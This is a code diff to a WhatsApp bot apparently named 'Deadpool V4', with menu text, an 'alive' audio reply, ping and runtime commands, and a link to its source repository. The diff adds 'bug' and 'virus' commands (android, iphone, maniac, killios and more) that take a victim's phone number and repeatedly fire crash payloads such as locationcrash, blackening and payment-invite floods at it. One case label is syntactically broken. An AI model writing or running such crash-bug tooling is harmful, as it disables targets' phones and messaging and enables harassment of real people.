@@ -105,7 +105,8 @@ const isUser = pengguna.includes(m.sender)
 const content = JSON.stringify(m.message)
 const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
 const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
-const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
+const quoted = m.quoted ? m.quoted : m
+const mime = (quoted.msg || quoted).mimetype || ''
 const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
 const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
 const bii = JSON.parse(fs.readFileSync('./baseikal/dbnye/wihh.json').toString())
@@ -212,11 +213,11 @@ m.reply(`${err}`)
 //=================================================
 async function loading () {
 var sanzytod = [
-"_Hello My Name is Confronter_",
-"_Base Script : Confronter_",
-"_Recode : CONFRONTER_",
-"_Website api : https://api.caliph.biz.id/_",
-"_Thank you for waiting_",
+"_❤️Hello My Name is Confronter☘️_",
+"_😍Base Script : Confronter💛_",
+"_🔶𝐂𝐨𝐮𝐧𝐭𝐫𝐲 : 𝐊𝐞𝐧𝐲𝐚🇰🇪",
+"_🖇𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 : 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫❇️_",
+"_💭Thank you for waiting😍_",
 ]
 let { key } = await haikal.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu
 
@@ -648,11 +649,11 @@ case 'menu':
 case 'denzy':
 if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
 var sanzytod = [
-"_Hello My Name is 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫_",
-"_Base Script : 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫_",
-"_Recode : 𝐅𝐫𝐚𝐧𝐤_",
-"_Website api : https://api.caliph.biz.id/_",
-"_Thank you for waiting_",
+"_😍Hello My Name is 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫📌_",
+"_❤️Base Script : 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫🖤_",
+"_✳️𝐂𝐨𝐮𝐧𝐭𝐫𝐲 : 𝐊𝐞𝐧𝐲𝐚🇰🇪",
+"_💭𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 : 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫_",
+"_🌚Thank you for waiting♥️_",
 `Hay Kak ${pushname} 👋 Selamat ${salam}
 Total Pengguna Premium :  ${owner.length}
 Status : ${isCreator ? 'Premium' : 'Free'}
@@ -668,16 +669,24 @@ Version 𝟒
 🌐 𝐎𝐰𝐧𝐞𝐫
 📌 𝐏𝐥𝐚𝐲
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+𝐃𝐞𝐚𝐝𝐩𝐨𝐨𝐥 𝐁𝐮𝐠𝐬
+🔹 iphone (254)
+♥️ android (254)
+📍 maniac (254)
+★★★★★★★★★★★★★★★
+𝐃𝐞𝐚𝐝𝐩𝐨𝐨𝐥 𝐕𝐢𝐫𝐮𝐬
+💭 virtex (254)
+★★★★★★★★★★★★★★★
 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐦𝐞𝐧𝐮
 ♻️ pengguna add (254xx)
 🔏 pengguna del (254xx)
 🤍 listban
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-`𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞`
+𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞
 🔏 hapusdb (628xx@s.whatsapp.net)
 🔏 listdb
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-`𝐎𝐭𝐡𝐞𝐫 𝐦𝐞𝐧𝐮`
+𝐎𝐭𝐡𝐞𝐫 𝐦𝐞𝐧𝐮
 ⏳ ɢᴀꜱᴍᴇɴᴜ
 ⏳ ɢᴀᴍᴇᴍᴇɴᴜ
 ⏳ ɪꜱʟᴀᴍᴍᴇɴᴜ
@@ -715,7 +724,15 @@ sendGeekzMessage(from, {
 text: `Hello ${pushname} 👋 Selamat ${salam}
 Total Premium :  ${owner.length}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-`SPAM BUG`
+𝐃𝐞𝐚𝐝𝐩𝐨𝐨𝐥 𝐁𝐮𝐠𝐬
+.android (254)
+.iphone (254)
+.maniac (254)
+᪥᪥᪥᪥᪥᪥᪥᪥᪥᪥᪥᪥
+𝐃𝐞𝐚𝐝𝐩𝐨𝐨𝐥 𝐕𝐢𝐫𝐮𝐬
+.virtex (254)
+𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔𖣔
+𝐒𝐩𝐚𝐦 𝐁𝐮𝐠
 ┏━━⊱
 ┣❏❤️ (Jumlah)
 ┣❏😁 (Jumlah)
@@ -727,7 +744,7 @@ Total Premium :  ${owner.length}
 ┣❏👊 (Jumlah)
 ┗━━⊱
 Contoh : 😂 5
-`𝐌𝐚𝐝𝐞 𝐛𝐲 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫`
+𝐌𝐚𝐝𝐞 𝐛𝐲 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫
 ┏━━⊱
 ┣❏🌷 (628xxxx)
 ┣❏🐵 (628xxxx)
@@ -748,7 +765,7 @@ Contoh : 😂 5
 ┣❏𝚂𝙴𝙽𝙳𝙸𝙽𝚅𝙸𝚃𝙴𝟹 (𝟼𝟸𝚇𝚇𝚇𝚇) 
 ┗━━⊱
  Example: 🌷 254798254076
-`Group Bug ID`
+𝐆𝐫𝐨𝐮𝐩 𝐁𝐮𝐠
 ┏━━⊱
 ┣❏ᴛʀᴏʟɪɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
 ┣❏ᴅᴏᴄᴜɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
@@ -759,7 +776,7 @@ Contoh : 😂 5
 ┣❏ᴜɴʟɪʙᴏᴍɢᴄ (ʟɪɴᴋ ɴʏᴀ)
 ┣❏ᴜɴʟɪᴄᴜʏɢᴄ (ʟɪɴᴋ ɴʏᴀ)
 ┗━━⊱
-`BUG SPAM`
+𝐁𝐮𝐠 𝐒𝐩𝐚𝐦
 ┏━━⊱
 ┣❏ᴜɴʟɪᴛᴇᴛ
 ┣❏ᴜɴʟɪᴛʀᴏʟɪ
@@ -771,7 +788,7 @@ Contoh : 😂 5
 ┣❏ᴜɴʟɪᴄᴜʏ
 ┗━━⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-`Bonus`
+𝐁𝐨𝐧𝐮𝐬
 ┏━━⊱
 ┣❏ʜᴀɪᴋᴀʟ
 ┣❏ɢᴏʏᴀɴɢ
@@ -795,6 +812,35 @@ mentionedJid:[sender],
 }
 })
 break
+case "alive":
+
+const audiovn = "./Deadpool.mp3";
+    const dooc = {
+        audio: {
+          url: audiovn
+        },
+        mimetype: 'audio/mp4',
+        ptt: true,
+        waveform:  [100, 0, 100, 0, 100, 0, 100],
+        fileName: "",
+
+        contextInfo: {
+          mentionedJid: [m.sender],
+          externalAdReply: {
+          title: "𝗗𝗲𝗮𝗱𝗽𝗼𝗼𝗹 𝐕𝟒 𝗶𝘀 𝗮𝗹𝗶𝘃𝗲 𝗠𝗼𝘁𝗵𝗲𝗿𝗳𝘂𝗰𝗸𝗲𝗿💀",
+          body: "https://whatsapp.com/channel/0029Vag3MeuGJP8LZb1Okj39",
+          thumbnailUrl: "https://telegra.ph/file/f4377f72ae8509762616a.jpg",
+          sourceUrl: "https://whatsapp.com/channel/0029Vag3MeuGJP8LZb1Okj39",
+          mediaType: 1,
+          renderLargerThumbnail: true
+          }}
+      };
+
+
+await haikal.sendMessage(m.chat, dooc, {quoted: m});
+
+
+break;		
 //=================================================//
 case 'groupmenu': {
 if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
@@ -977,7 +1023,49 @@ ${prefix} alquran
 ${prefix} listsurah`)
 }
 break
+case 'ping': {
+  const startTime = new Date();
+  const pingMsg = await zetsubo.sendMessage(m.chat, { text: '𝐅𝐮𝐜𝐤𝐲𝐨𝐮 𝐃𝐞𝐚𝐝𝐩𝐨𝐨𝐥 𝐕𝟒 𝐏𝐢𝐧𝐠𝐢𝐧𝐠..' });
+
+ await haikal.relayMessage(m.chat, {
+      protocolMessage: {
+        key: pingMsg.key,
+        type: 14,
+        editedMessage: {
+          conversation: `*𝗗𝗘𝗔𝗗𝗣𝗢𝗢𝗟𝗜𝗙𝗜𝗘𝗗 ➟* *${new Date() - startTime}* 𝐌/𝐒`
+        }
+      }
+    }, {});
+  } 
+break
+case		
+runtime':
+                let pinga = `𝐃𝐄𝐀𝐃𝐏𝐎𝐎𝐋 𝐕𝟒 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫.${runtime(process.uptime())}`
+                haikal.sendMessage(m.chat, {
+                    text: pinga,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: botname,
+                            body: ownername,
+                            thumbnailUrl: 'zetszet/cheemspic.jpg',
+                            sourceUrl: 'https://chat.whatsapp.com/Cl7CwM1UC9YEOWEiCzLAfe',
+                            mediaType: 1,
+                            renderLargerThumbnail: true
+                        }
+                    }
+                }, {
+                    quoted: m
+                })		
 //=================================================//
+break
+case 'sc': case 'script': case 'repo':
+
+ zetsubo.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/8c7d8176e16d36ab5ad6c.jpg` }, caption: 
+`💀𝐘𝐨𝐮 𝐍𝐞𝐞𝐝 𝐌𝐲 𝐒𝐜𝐫𝐢𝐩𝐭 𝐌𝐨𝐭𝐡𝐞𝐫𝐟𝐮𝐜𝐤𝐞𝐫😂\n\n 📌𝐇𝐞𝐲  *${pushname}* \n\n ❗️ 𝐀𝐌 𝐃𝐄𝐀𝐃𝐏𝐎𝐎𝐋 𝐁𝐔𝐆 𝐕𝟒⌛️.\n\n ❗️𝐆𝐄𝐓 𝐒𝐎𝐔𝐑𝐂𝐄 .\n\n ⌛️𝐕𝐈𝐀 𝐋𝐈𝐍𝐊 𝐁𝐄𝐋𝐎𝐖 ⇣⇣.\n\n 🔇𝐅𝐎𝐑𝐊 𝐀𝐍𝐃 𝐒𝐓𝐀𝐑🌟➻🔗 ❴ https://github.com/Confronter/Deadpool-Md ❵\n\n 🔇𝐑𝐄𝐀𝐃𝐌𝐄 𝐁𝐄𝐅𝐎𝐑𝐄 𝐃𝐄𝐏𝐋𝐎𝐘𝐌𝐄𝐍𝐓.\n\n ❗️𝐌𝐀𝐃𝐄 𝐁𝐘 𝐂𝐎𝐍𝐅𝐑𝐎𝐍𝐓𝐄𝐑\n\n💀💀💀
+ > 𝐁𝐨𝐭 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫⸼` });
+
+   break;		
 case 'gasmenu': {
 if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
 await loading()
@@ -1426,6 +1514,106 @@ mentionedJid:[sender],
 }
 })
 break
+case 'android': case 'xandro':  case 'killandro': {
+if (!isPremium) return replyz(mess.premium)
+if (!text) return replyz(`Example: .${command} 2547xxx`)
+let peler = q.replace(/[^0-9]/g, "")
+if (peler.startsWith('0')) return replyz(`\`[ # ]\` 𝖠𝗆 𝖴𝗇𝖽𝖾𝖿𝖾𝖺𝗍𝖾𝖽 𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅 𝗆𝖺𝖽𝖾 𝖻𝗒 𝖢𝗈𝗇𝖿𝗋𝗈𝗇𝗍𝖾𝗋\n\n\`[ # ]\` Example : .${command} 2547xxx`)
+let Pe = peler + '@s.whatsapp.net'
+await replyz(mess.bugrespon)
+for (let j = 0; j < 5; j++) {
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe)
+await sendExtendedTextMessage(Pe, force)
+await blackening(Pe, force2)
+await listfuck(Pe, oneclick)
+await sendMultiplePaymentInvites(Pe)
+await listfuck(Pe)
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅 \``}, {quoted: m})
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅\``}, {quoted: m})
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅\``}, {quoted: m})
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅 \``}, {quoted: m})
+await sendPaymentInfoMessage(Pe)
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe, deadpoolbug)
+await sendPaymentInfoMessage(Pe, force2)
+await bakdok(Pe, deadpoolbug)
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe)
+}
+await replyz(mess.donebug)
+}
+break	
+case 'iphone': case 'xiphone':  case 'killios': {
+if (!isPremium) return replyz(mess.premium)
+if (!text) return replyz(`Example: .${command} 2547xxx`)
+let peler = q.replace(/[^0-9]/g, "")
+if (peler.startsWith('0')) return replyz(`\`[ # ]\` 𝖠𝗆 𝖴𝗇𝖽𝖾𝖿𝖾𝖺𝗍𝖾𝖽 𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅 𝖬𝖺𝖽𝖾 𝖻𝗒 𝖢𝗈𝗇𝖿𝗋𝗈𝗇𝗍𝖾𝗋\n\n\`[ # ]\` Example : .${command} 2547xxx`)
+let Pe = peler + '@s.whatsapp.net'
+await replyz(mess.bugrespon)
+for (let j = 0; j < 5; j++) {
+await aipong(Pe)
+await sendMultiplePaymentInvites(Pe)
+await sendMultiplePaymentInvites(Pe, oneclick)
+await sendExtendedTextMessage(Pe, force)
+await blackening(Pe, force2)
+await locationcrash(Pe,deadpoolbug)
+await listfuck(Pe, oneclick)
+await sendPaymentInfoMessage(Pe)
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe)
+haikal.sendMessage(Pe, {text: `\`𝖨𝗉𝗁𝗈𝗇𝖾 𝖣𝖾𝖺𝖽 \``}, {quoted: m})
+await sleep(500)
+haikal.sendMessage(Pe, {text: `\`𝖨𝗉𝗁𝗈𝗇𝖾 𝖣𝖾𝖺𝖽\``}, {quoted: m})
+await sleep(500)
+haikal.sendMessage(Pe, {text: `\`𝖨𝗉𝗁𝗈𝗇𝖾 𝖣𝖾𝖺𝖽\``}, {quoted: m})
+await sleep(500)
+haikal.sendMessage(Pe, {text: `\`𝖨𝗉𝗁𝗈𝗇𝖾 𝖣𝖾𝖺𝖽\``}, {quoted: m})
+await sleep(500)
+await sendMultiplePaymentInvites(Pe, force)
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe)
+await listfuck(Pe)
+await bakdok(Pe, deadpoolbug)
+}
+await replyz(mess.donebug)
+}
+break	
+case 'onlybug': case 'onekill': case 'doublekill': case 'triplekill':  case 'maniac': case 'savage': {
+if (!isPremium) return replyz(mess.premium)
+if (!text) return replyz(`Example: .${command} 2547xxx`)
+let peler = q.replace(/[^0-9]/g, "")
+if (peler.startsWith('0')) return replyz(`\`[ # ]\` 𝖠𝗆 𝗎𝗇𝖽𝖾𝖿𝖾𝖺𝗍𝖾𝖽 𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅 𝗆𝖺𝖽𝖾 𝖻𝗒 𝖢𝗈𝗇𝖿𝗋𝗈𝗇𝗍𝖾𝗋\n\n\`[ # ]\` Example : .${command} 2547xxx`)
+let Pe = peler + '@s.whatsapp.net'
+await replyz(mess.bugrespon)
+for (let j = 0; j < 5; j++) {
+await sendPaymentInfoMessage(Pe)
+await sendMultiplePaymentInvites(Pe, force)
+await locationcrash(Pe)
+await listfuck(Pe, oneclick)
+await sendExtendedTextMessage(Pe, force)
+await blackening(Pe, force2)
+await sendMultiplePaymentInvites(Pe)
+await sendPaymentInfoMessage(Pe, zpay)
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe, deadpoolbug)
+await sendPaymentInfoMessage(Pe, force)
+await locationcrash(Pe, force2)
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅\``}, {quoted: m})
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅\``}, {quoted: m})
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅\``}, {quoted: m})
+haikal.sendMessage(Pe, {text: `\`𝖣𝖾𝖺𝖽𝗉𝗈𝗈𝗅\``}, {quoted: m})
+await sendPaymentInfoMessage(Pe, force2)
+await bakdok(Pe, deadpoolbug)
+await listfuck(Pe)
+await sendMultiplePaymentInvites(Pe)
+await sendPaymentInfoMessage(Pe, deadpoolbug)
+await sendMultiplePaymentInvites(Pe)
+await locationcrash(Pe,deadpoolbug)
+}
+await replyz(mess.donebug)
+}
+break		
 //=================================================//
 case 'asupan':
 if (!isCreator) return m.reply('*_Maaf, Sc Ini Bersifat Private_*')
